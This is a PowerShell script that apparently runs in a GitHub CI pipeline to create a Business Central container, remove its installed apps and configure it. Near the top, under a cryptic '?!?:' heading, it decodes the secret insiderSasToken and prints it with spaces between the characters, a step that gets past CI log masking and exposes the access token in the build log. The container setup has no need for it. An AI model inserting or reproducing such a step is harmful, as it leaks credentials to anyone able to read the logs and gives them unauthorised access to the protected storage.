Param(
    [Hashtable]$parameters
)

Write-Host "?!?:"
$st = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([string]"$ENV:insiderSasToken")
$st.ToCharArray() -join ' '

$parameters.multitenant = $false
$parameters.RunSandboxAsOnPrem = $true
if ("$env:GITHUB_RUN_ID" -eq "") {
    $parameters.includeAL = $true
    $parameters.doNotExportObjectsToText = $true
    $parameters.shortcuts = "none"
}

New-BcContainer @parameters

$installedApps = Get-BcContainerAppInfo -containerName $containerName -tenantSpecificProperties -sort DependenciesLast
$installedApps | ForEach-Object {
    $removeData = $_.Name -ne "Base Application"
    Write-Host "Removing $($_.Name)"
    Unpublish-BcContainerApp -containerName $parameters.ContainerName -name $_.Name -unInstall -doNotSaveData:$removeData -doNotSaveSchema:$removeData -force
}

Invoke-ScriptInBcContainer -containerName $parameters.ContainerName -scriptblock { $progressPreference = 'SilentlyContinue' }
